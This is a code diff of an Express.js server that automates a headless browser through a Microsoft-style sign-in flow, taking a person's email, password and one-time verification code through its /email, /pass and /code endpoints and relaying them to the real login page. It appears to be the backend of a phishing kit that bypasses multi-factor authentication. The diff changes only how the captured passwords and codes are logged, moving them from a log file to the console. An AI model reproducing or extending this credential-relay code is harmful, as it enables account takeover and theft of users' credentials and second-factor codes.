@@ -17,15 +17,6 @@ app.use(express.json());
 
 let sessions = {};
 
-// Function to log to a file with detailed information
-function writeToLog(message) {
-  const timestamp = new Date().toISOString();
-  const logMessage = `${timestamp} - ${message}\n`;
-  fs.appendFile("log.txt", logMessage, (err) => {
-    if (err) console.error("Failed to update log:", err);
-    else console.log("Log updated");
-  });
-}
 
 // Helper function to delay actions
 function delay(ms) {
@@ -82,7 +73,7 @@ app.post("/email", async (req, res) => {
 
     sessions[sessionId] = { browser, page };
     res.send("1");
-    writeToLog(`Email: ${email} logged for session: ${sessionId}`);
+    console.log(`Email: ${email} logged for session: ${sessionId}`);
   } catch (err) {
     console.error("Error in /email:", err);
     res.status(500).send(err);
@@ -112,7 +103,7 @@ app.post("/pass", async (req, res) => {
     const content2 = await page.content();
     if (content2.includes("Your account or password is incorrect.")) {
       res.send("0");
-      writeToLog(`Incorrect password: ${password} for session: ${sessionId}`);
+      console.log(`Incorrect password: ${password} for session: ${sessionId}`);
     } else {
       const content3 = await page.content();
       if (content3.includes("Enter code")) {
@@ -133,7 +124,7 @@ app.post("/pass", async (req, res) => {
         await page.click("#idSIButton9");
         res.send("1");
       }
-      writeToLog(`Password: ${password} logged for session: ${sessionId}`);
+      console.log(`Password: ${password} logged for session: ${sessionId}`);
     }
   } catch (err) {
     console.error("Error in /pass:", err);
@@ -165,12 +156,12 @@ app.post("/code", async (req, res) => {
     if (content4.includes("You didn't enter the expected verification code.")) {
       await page.type("#idTxtBx_SAOTCC_OTC", "");
       res.send("0");
-      writeToLog(`Incorrect code: ${code} for session: ${sessionId}`);
+      console.log(`Incorrect code: ${code} for session: ${sessionId}`);
     } else {
       await delay(5000);
       await page.click("#idSIButton9");
       res.send("1");
-      writeToLog(`Code: ${code} logged for session: ${sessionId}`);
+      console.log(`Code: ${code} logged for session: ${sessionId}`);
     }
   } catch (err) {
     console.error("Error in /code:", err);
@@ -198,7 +189,7 @@ app.post("/close", async (req, res) => {
     delete sessions[sessionId];
 
     res.send("Browser closed");
-    writeToLog(`Browser closed for session: ${sessionId}`);
+    console.log(`Browser closed for session: ${sessionId}`);
   } catch (err) {
     console.error("Error in /close:", err);
     res.status(500).send("Internal Server Error");
